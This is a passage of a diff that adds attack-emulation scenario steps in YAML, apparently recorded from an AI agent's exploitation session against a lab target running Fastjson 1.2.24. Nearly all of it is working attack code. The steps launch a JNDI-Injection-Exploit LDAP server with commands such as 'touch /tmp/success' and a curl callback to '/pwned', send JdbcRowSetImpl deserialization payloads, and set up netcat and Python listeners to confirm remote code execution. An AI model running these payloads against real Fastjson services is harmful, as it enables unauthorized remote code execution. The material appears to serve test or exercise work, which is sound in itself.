+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/32-1-2-24-rce-stop-the-previous-exploit-server.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+- id: 33-1-2-24-rce-restart-exploit-server-with-touch-command
+  stage: execution
+  actor: attacker
+  description: Restart exploit server with touch command
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C
+      "touch /tmp/success" -A "{{ target_ip }}" &
+
+      sleep 6
+
+      echo "Server ready") > /tmp/cvelab-sysfield/33-1-2-24-rce-restart-exploit-server-with-touch-command.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/33-1-2-24-rce-restart-exploit-server-with-touch-command.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/33-1-2-24-rce-restart-exploit-server-with-touch-command.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 32-1-2-24-rce-stop-the-previous-exploit-server
+- id: 34-1-2-24-rce-check-new-exploit-server-output
+  stage: execution
+  actor: attacker
+  description: Check new exploit server output
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 6 && cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/bos2l5sxm.output)
+      > /tmp/cvelab-sysfield/34-1-2-24-rce-check-new-exploit-server-output.out 2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/34-1-2-24-rce-check-new-exploit-server-output.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/34-1-2-24-rce-check-new-exploit-server-output.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 33-1-2-24-rce-restart-exploit-server-with-touch-command
+- id: 35-1-2-24-rce-send-exploit-payload-with-new-ldap-token
+  stage: execution
+  actor: attacker
+  description: Send exploit payload with new LDAP token
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -s -X POST http://{{ target_ip }}:8090/ -H "Content-Type: application/json"
+      -d ''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{
+      target_ip }}:1389/kgcpsl","autoCommit":true}}'') > /tmp/cvelab-sysfield/35-1-2-24-rce-send-exploit-payload-with-new-ldap-token.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/35-1-2-24-rce-send-exploit-payload-with-new-ldap-token.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/35-1-2-24-rce-send-exploit-payload-with-new-ldap-token.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 34-1-2-24-rce-check-new-exploit-server-output
+- id: 36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+  stage: execution
+  actor: attacker
+  description: Check exploit server logs for JNDI connection
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/bos2l5sxm.output
+      | tail -10) > /tmp/cvelab-sysfield/36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 35-1-2-24-rce-send-exploit-payload-with-new-ldap-token
+- id: 37-1-2-24-rce-start-callback-listener-to-verify-rce
+  stage: execution
+  actor: attacker
+  description: Start callback listener to verify RCE
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(python3 -c \"\nimport http.server\n\
+      import socketserver\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n\
+      \        print(f'[CALLBACK] Got request: {self.path}')\n        self.send_response(200)\n\
+      \        self.end_headers()\nsocketserver.TCPServer.allow_reuse_address = True\n\
+      with socketserver.TCPServer(('{{ target_ip }}', 9999), H) as s:\n    print('[CALLBACK]\
+      \ Listening on 9999...')\n    s.handle_request()\n    print('[CALLBACK] Done!')\n\
+      \" &\nsleep 2\necho \"Listener started\") > /tmp/cvelab-sysfield/37-1-2-24-rce-start-callback-listener-to-verify-rce.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/37-1-2-24-rce-start-callback-listener-to-verify-rce.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/37-1-2-24-rce-start-callback-listener-to-verify-rce.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+- id: 38-1-2-24-rce-restart-exploit-with-curl-callback-command
+  stage: execution
+  actor: attacker
+  description: Restart exploit with curl callback command
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 3 && pkill -f JNDI-Injection-Exploit 2>/dev/null; sleep 2; cd /tmp/exploit
+      && java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl http://{{
+      target_ip }}:9999/pwned" -A "{{ target_ip }}" &
+
+      sleep 6
+
+      cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/bos2l5sxm.output
+      | tail -3 2>/dev/null
+
+      echo "---"
+
+      ls /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/ 2>/dev/null)
+      > /tmp/cvelab-sysfield/38-1-2-24-rce-restart-exploit-with-curl-callback-command.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/38-1-2-24-rce-restart-exploit-with-curl-callback-command.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/38-1-2-24-rce-restart-exploit-with-curl-callback-command.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 37-1-2-24-rce-start-callback-listener-to-verify-rce
+- id: 39-1-2-24-rce-check-latest-exploit-server-output
+  stage: execution
+  actor: attacker
+  description: Check latest exploit server output
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 8 && cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/b0io2qiiw.output)
+      > /tmp/cvelab-sysfield/39-1-2-24-rce-check-latest-exploit-server-output.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/39-1-2-24-rce-check-latest-exploit-server-output.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/39-1-2-24-rce-check-latest-exploit-server-output.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 38-1-2-24-rce-restart-exploit-with-curl-callback-command
+- id: 40-1-2-24-rce-clean-up-old-processes
+  stage: execution
+  actor: attacker
+  description: Clean up old processes
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (pkill -9 -f JNDI-Injection 2>/dev/null; pkill -9 -f "python3 -c" 2>/dev/null;
+      sleep 1; echo "cleaned") > /tmp/cvelab-sysfield/40-1-2-24-rce-clean-up-old-processes.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/40-1-2-24-rce-clean-up-old-processes.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/40-1-2-24-rce-clean-up-old-processes.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 39-1-2-24-rce-check-latest-exploit-server-output
+- id: 41-1-2-24-rce-start-exploit-server-and-callback-listener
+  stage: execution
+  actor: attacker
+  description: Start exploit server and callback listener
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(cd /tmp/exploit && nohup java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\
+      \ -C \"curl http://{{ target_ip }}:9999/pwned\" -A \"{{ target_ip }}\" > /tmp/exploit_server.log\
+      \ 2>&1 &\necho \"Exploit server PID: $!\"\n# Start callback listener\npython3\
+      \ -c \"\nimport http.server, socketserver, threading, time\n\nclass H(http.server.BaseHTTPRequestHandler):\n\
+      \    def do_GET(self):\n        print(f'[CALLBACK RECEIVED] Path: {self.path}')\n\
+      \        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\
+      \nsocketserver.TCPServer.allow_reuse_address = True\nserver = socketserver.TCPServer(('{{\
+      \ target_ip }}', 9999), H)\nprint('[CALLBACK] Listening on :9999...')\n# Handle\
+      \ one request then exit\nserver.handle_request()\nprint('[CALLBACK] Request\
+      \ received! Exploit confirmed!')\n\" > /tmp/callback.log 2>&1 &\necho \"Callback\
+      \ PID: $!\") > /tmp/cvelab-sysfield/41-1-2-24-rce-start-exploit-server-and-callback-listener.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/41-1-2-24-rce-start-exploit-server-and-callback-listener.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/41-1-2-24-rce-start-exploit-server-and-callback-listener.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 40-1-2-24-rce-clean-up-old-processes
+- id: 42-1-2-24-rce-check-exploit-server-log
+  stage: execution
+  actor: attacker
+  description: Check exploit server log
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 8 && cat /tmp/exploit_server.log) > /tmp/cvelab-sysfield/42-1-2-24-rce-check-exploit-server-log.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/42-1-2-24-rce-check-exploit-server-log.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/42-1-2-24-rce-check-exploit-server-log.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 41-1-2-24-rce-start-exploit-server-and-callback-listener
+- id: 43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token
+  stage: execution
+  actor: attacker
+  description: Send exploit payload with curl callback LDAP token
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -s -X POST http://{{ target_ip }}:8090/ -H "Content-Type: application/json"
+      -d ''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{
+      target_ip }}:1389/wty8dv","autoCommit":true}}'') > /tmp/cvelab-sysfield/43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 42-1-2-24-rce-check-exploit-server-log
+- id: 44-1-2-24-rce-check-callback-and-exploit-server-logs
+  stage: execution
+  actor: attacker
+  description: Check callback and exploit server logs
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 5 && cat /tmp/callback.log && echo "---" && cat /tmp/exploit_server.log
+      | tail -10) > /tmp/cvelab-sysfield/44-1-2-24-rce-check-callback-and-exploit-server-logs.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/44-1-2-24-rce-check-callback-and-exploit-server-logs.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/44-1-2-24-rce-check-callback-and-exploit-server-logs.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token
+- id: 45-1-2-24-rce-restart-callback-and-re-send-exploit
+  stage: execution
+  actor: attacker
+  description: Restart callback and re-send exploit
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(fuser -k 9999/tcp 2>/dev/null; sleep\
+      \ 1\n# Restart callback listener on port 9999\npython3 -c \"\nimport http.server,\
+      \ socketserver\n\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n\
+      \        print(f'[CALLBACK RECEIVED] Path: {self.path}')\n        self.send_response(200)\n\
+      \        self.end_headers()\n        self.wfile.write(b'OK')\n    def log_message(self,\
+      \ format, *args):\n        print(f'[HTTP] {args}')\n\nsocketserver.TCPServer.allow_reuse_address\
+      \ = True\nwith socketserver.TCPServer(('{{ target_ip }}', 9999), H) as s:\n\
+      \    print('[CALLBACK] Listening on :9999...')\n    s.handle_request()\n   \
+      \ print('[CALLBACK] Done!')\n\" &\nsleep 2\n\n# Now send the payload again with\
+      \ a new token\n# First get the current token\nTOKEN=$(grep 'ldap://{{ target_ip\
+      \ }}:1389/' /tmp/exploit_server.log | grep 'JDK 1.8' | tail -1 | grep -oP '1389/\\\
+      K\\w+')\necho \"Token: $TOKEN\"\n\ncurl -s -X POST http://{{ target_ip }}:8090/\
+      \ -H \"Content-Type: application/json\" -d \"{\\\"b\\\":{\\\"@type\\\":\\\"\
+      com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://{{ target_ip\
+      \ }}:1389/${TOKEN}\\\",\\\"autoCommit\\\":true}}\") > /tmp/cvelab-sysfield/45-1-2-24-rce-restart-callback-and-re-send-exploit.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/45-1-2-24-rce-restart-callback-and-re-send-exploit.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/45-1-2-24-rce-restart-callback-and-re-send-exploit.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 44-1-2-24-rce-check-callback-and-exploit-server-logs
+- id: 46-1-2-24-rce-check-for-callback-receipt
+  stage: execution
+  actor: attacker
+  description: Check for callback receipt
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 5 && jobs -l 2>/dev/null; fg 2>/dev/null; wait 2>/dev/null; echo "Callbacks:";
+      cat /tmp/callback.log 2>/dev/null; echo "---"; cat /tmp/exploit_server.log |
+      tail -10) > /tmp/cvelab-sysfield/46-1-2-24-rce-check-for-callback-receipt.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/46-1-2-24-rce-check-for-callback-receipt.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/46-1-2-24-rce-check-for-callback-receipt.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 45-1-2-24-rce-restart-callback-and-re-send-exploit
+- id: 47-1-2-24-rce-use-netcat-for-callback-and-check-token
+  stage: execution
+  actor: attacker
+  description: Use netcat for callback and check token
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (fuser -vk 9999/tcp 2>/dev/null; sleep 2
+
+      # Use netcat instead
+
+      nc -l -p 9999 -w 15 &
+
+      NC_PID=$!
+
+      sleep 1
+
+      echo "Netcat listening PID: $NC_PID"
+
+
+      # Send payload with correct token
+
+      cat /tmp/exploit_server.log | grep "JDK 1.8" | grep ldap) > /tmp/cvelab-sysfield/47-1-2-24-rce-use-netcat-for-callback-and-check-token.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/47-1-2-24-rce-use-netcat-for-callback-and-check-token.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/47-1-2-24-rce-use-netcat-for-callback-and-check-token.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 46-1-2-24-rce-check-for-callback-receipt
+- id: 48-1-2-24-rce-find-what-s-using-port-9999
+  stage: execution
+  actor: attacker
+  description: Find what's using port 9999
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (ss -tlnp | grep 9999; fuser 9999/tcp 2>/dev/null; lsof -i :9999 2>/dev/null)
+      > /tmp/cvelab-sysfield/48-1-2-24-rce-find-what-s-using-port-9999.out 2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/48-1-2-24-rce-find-what-s-using-port-9999.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/48-1-2-24-rce-find-what-s-using-port-9999.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 47-1-2-24-rce-use-netcat-for-callback-and-check-token
+- id: 49-1-2-24-rce-verify-exploit-with-callback-on-port-7777
+  stage: execution
+  actor: attacker
+  description: Verify exploit with callback on port 7777
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(# Use a different port for callback\n\
+      nc -l -p 7777 -w 30 &\nNC_PID=$!\nsleep 2\n\n# Restart exploit server with curl\
+      \ callback on port 7777\npkill -9 -f JNDI-Injection 2>/dev/null\nsleep 1\n\n\
+      cd /tmp/exploit && nohup java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\
+      \ -C \"curl http://{{ target_ip }}:7777/pwned\" -A \"{{ target_ip }}\" > /tmp/exploit_server2.log\
+      \ 2>&1 &\nsleep 8\n\n# Get token\nTOKEN=$(grep \"JDK 1.8\" /tmp/exploit_server2.log\
+      \ | grep ldap | grep -oP '1389/\\K\\w+')\necho \"Token: $TOKEN\"\n\n# Send payload\n\
+      curl -s -X POST http://{{ target_ip }}:8090/ -H \"Content-Type: application/json\"\
+      \ \\\n  -d \"{\\\"b\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"\
+      ,\\\"dataSourceName\\\":\\\"ldap://{{ target_ip }}:1389/${TOKEN}\\\",\\\"autoCommit\\\
+      \":true}}\"\n\nsleep 10\necho \"=== Netcat output ===\"\n# Check if anything\
+      \ came through) > /tmp/cvelab-sysfield/49-1-2-24-rce-verify-exploit-with-callback-on-port-7777.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/49-1-2-24-rce-verify-exploit-with-callback-on-port-7777.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/49-1-2-24-rce-verify-exploit-with-callback-on-port-7777.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 48-1-2-24-rce-find-what-s-using-port-9999
+- id: 50-1-2-24-rce-final-verification-with-callback-listener
+  stage: execution
+  actor: attacker
+  description: Final verification with callback listener
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(pkill -9 -f JNDI-Injection 2>/dev/null;\
+      \ sleep 2\n\n# Start callback listener on port 7777 using Python\npython3 <<\
+      \ 'PYEOF' &\nimport http.server\nimport socketserver\n\nclass H(http.server.BaseHTTPRequestHandler):\n\
+      \    def do_GET(self):\n        print(f'[CALLBACK RECEIVED] Path: {self.path}')\n\
+      \        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\
+      \    def log_message(self, format, *args):\n        pass\n\nsocketserver.TCPServer.allow_reuse_address\
+      \ = True\nwith socketserver.TCPServer(('{{ target_ip }}', 7777), H) as s:\n\
+      \    print('[CALLBACK] Listening on :7777...')\n    s.socket.settimeout(30)\n\
+      \    s.handle_request()\n    print('[CALLBACK] Done!')\nPYEOF\nsleep 2\n\n#\
+      \ Start exploit server\ncd /tmp/exploit && java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\
+      \ -C \"curl -s http://{{ target_ip }}:7777/pwned\" -A \"{{ target_ip }}\" >\
+      \ /tmp/exploit_server3.log 2>&1 &\nsleep 8\n\nTOKEN=$(grep \"JDK 1.8\" /tmp/exploit_server3.log\
+      \ | grep ldap | grep -oP '1389/\\K\\w+')\necho \"Token: $TOKEN\"\n\ncurl -s\
+      \ -X POST http://{{ target_ip }}:8090/ -H \"Content-Type: application/json\"\
+      \ \\\n  -d \"{\\\"b\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"\
+      ,\\\"dataSourceName\\\":\\\"ldap://{{ target_ip }}:1389/${TOKEN}\\\",\\\"autoCommit\\\
+      \":true}}\"\n\nsleep 10\necho \"=== Done ===\") > /tmp/cvelab-sysfield/50-1-2-24-rce-final-verification-with-callback-listener.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/50-1-2-24-rce-final-verification-with-callback-listener.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/50-1-2-24-rce-final-verification-with-callback-listener.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 49-1-2-24-rce-verify-exploit-with-callback-on-port-7777
+- id: 51-1-2-24-rce-clean-up-all-processes
+  stage: execution
+  actor: attacker
+  description: Clean up all processes
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (pkill -9 -f JNDI-Injection 2>/dev/null; pkill -9 -f "python3" 2>/dev/null;
+      sleep 2; echo "cleaned") > /tmp/cvelab-sysfield/51-1-2-24-rce-clean-up-all-processes.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/51-1-2-24-rce-clean-up-all-processes.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/51-1-2-24-rce-clean-up-all-processes.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 50-1-2-24-rce-final-verification-with-callback-listener
+- id: 52-1-2-24-rce-check-remaining-processes
+  stage: execution
+  actor: attacker
+  description: Check remaining processes
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (ps aux | grep -E "java|python" | grep -v grep) > /tmp/cvelab-sysfield/52-1-2-24-rce-check-remaining-processes.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/52-1-2-24-rce-check-remaining-processes.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/52-1-2-24-rce-check-remaining-processes.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 51-1-2-24-rce-clean-up-all-processes
+- id: 53-1-2-24-rce-kill-zombie-processes
+  stage: execution
+  actor: attacker
+  description: Kill zombie processes
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (kill -9 446 2>/dev/null; kill -9 396 2>/dev/null; kill -9 395 2>/dev/null;
+      kill -9 328 2>/dev/null; kill -9 273 2>/dev/null; sleep 2; echo "killed zombies")
+      > /tmp/cvelab-sysfield/53-1-2-24-rce-kill-zombie-processes.out 2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/53-1-2-24-rce-kill-zombie-processes.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/53-1-2-24-rce-kill-zombie-processes.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 52-1-2-24-rce-check-remaining-processes
+validation:
+  success_criteria:
+  - step: 01-1-2-24-rce-check-the-fastjson-service-on-target
+    condition: exit_code
+    value: 0
+  - step: 02-1-2-24-rce-test-post-to-fastjson-service
+    condition: exit_code
+    value: 0
+  - step: 03-1-2-24-rce-check-if-java-is-available
+    condition: exit_code
+    value: 0
+  - step: 04-1-2-24-rce-check-python-version
+    condition: exit_code
+    value: 0
+  - step: 05-1-2-24-rce-get-my-container-s-ip-address
+    condition: exit_code
+    value: 0
+  - step: 06-1-2-24-rce-check-for-pre-existing-tools
+    condition: exit_code
+    value: 0
+  - step: 07-1-2-24-rce-search-for-marshalsec-jar
+    condition: exit_code
+    value: 0
+  - step: 08-1-2-24-rce-create-and-compile-malicious-java-class
+    condition: exit_code
+    value: 0
+  - step: 09-1-2-24-rce-check-for-jdk-installation
+    condition: exit_code
+    value: 0
+  - step: 10-1-2-24-rce-install-jdk-for-javac
+    condition: exit_code
+    value: 0
+  - step: 11-1-2-24-rce-download-pre-built-marshalsec-jar
+    condition: exit_code
+    value: 0
+  - step: 12-1-2-24-rce-try-to-install-python-jndi-exploit-tool
+    condition: exit_code
+    value: 0
+  - step: 13-1-2-24-rce-clone-python-based-jndi-exploit-tool
+    condition: exit_code
+    value: 0
+  - step: 14-1-2-24-rce-try-single-file-compilation-with-java
+    condition: exit_code
+    value: 0
+  - step: 15-1-2-24-rce-compile-java-class-with-single-file-source-mode
+    condition: exit_code
+    value: 0
+  - step: 16-1-2-24-rce-search-for-javac-in-jvm-paths
+    condition: exit_code
+    value: 0
+  - step: 17-1-2-24-rce-download-jdk-deb-package
+    condition: exit_code
+    value: 0
+  - step: 18-1-2-24-rce-download-pre-compiled-exploit-class
+    condition: exit_code
+    value: 0
+  - step: 19-1-2-24-rce-search-for-available-jdk-packages
+    condition: exit_code
+    value: 0
+  - step: 20-1-2-24-rce-check-for-eclipse-java-compiler
+    condition: exit_code
+    value: 0
+  - step: 21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github
+    condition: exit_code
+    value: 0
+  - step: 22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file
+    condition: exit_code
+    value: 0
+  - step: 23-1-2-24-rce-check-file-type-and-magic-bytes
+    condition: exit_code
+    value: 0
+  - step: 24-1-2-24-rce-check-magic-bytes-of-class-file
+    condition: exit_code
+    value: 0
+  - step: 25-1-2-24-rce-find-jar-files-in-jvm
+    condition: exit_code
+    value: 0
+  - step: 26-1-2-24-rce-start-planning-class-file-generation
+    condition: exit_code
+    value: 0
+  - step: 27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar
+    condition: exit_code
+    value: 0
+  - step: 28-1-2-24-rce-start-jndi-injection-exploit-server
+    condition: exit_code
+    value: 0
+  - step: 29-1-2-24-rce-check-exploit-server-output
+    condition: exit_code
+    value: 0
+  - step: 30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection
+    condition: exit_code
+    value: 0
+  - step: 31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+    condition: exit_code
+    value: 0
+  - step: 32-1-2-24-rce-stop-the-previous-exploit-server
+    condition: exit_code
+    value: 0
+  - step: 33-1-2-24-rce-restart-exploit-server-with-touch-command
+    condition: exit_code
+    value: 0
+  - step: 34-1-2-24-rce-check-new-exploit-server-output
+    condition: exit_code
+    value: 0
+  - step: 35-1-2-24-rce-send-exploit-payload-with-new-ldap-token
+    condition: exit_code
+    value: 0
+  - step: 36-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+    condition: exit_code
+    value: 0
+  - step: 37-1-2-24-rce-start-callback-listener-to-verify-rce
+    condition: exit_code
+    value: 0
+  - step: 38-1-2-24-rce-restart-exploit-with-curl-callback-command
+    condition: exit_code
+    value: 0
+  - step: 39-1-2-24-rce-check-latest-exploit-server-output
+    condition: exit_code
+    value: 0
+  - step: 40-1-2-24-rce-clean-up-old-processes
+    condition: exit_code
+    value: 0
+  - step: 41-1-2-24-rce-start-exploit-server-and-callback-listener
+    condition: exit_code
+    value: 0
+  - step: 42-1-2-24-rce-check-exploit-server-log
+    condition: exit_code
+    value: 0
+  - step: 43-1-2-24-rce-send-exploit-payload-with-curl-callback-ldap-token
+    condition: exit_code
+    value: 0
+  - step: 44-1-2-24-rce-check-callback-and-exploit-server-logs
+    condition: exit_code
+    value: 0
+  - step: 45-1-2-24-rce-restart-callback-and-re-send-exploit
+    condition: exit_code
+    value: 0
+  - step: 46-1-2-24-rce-check-for-callback-receipt
+    condition: exit_code
+    value: 0
+  - step: 47-1-2-24-rce-use-netcat-for-callback-and-check-token
+    condition: exit_code
+    value: 0
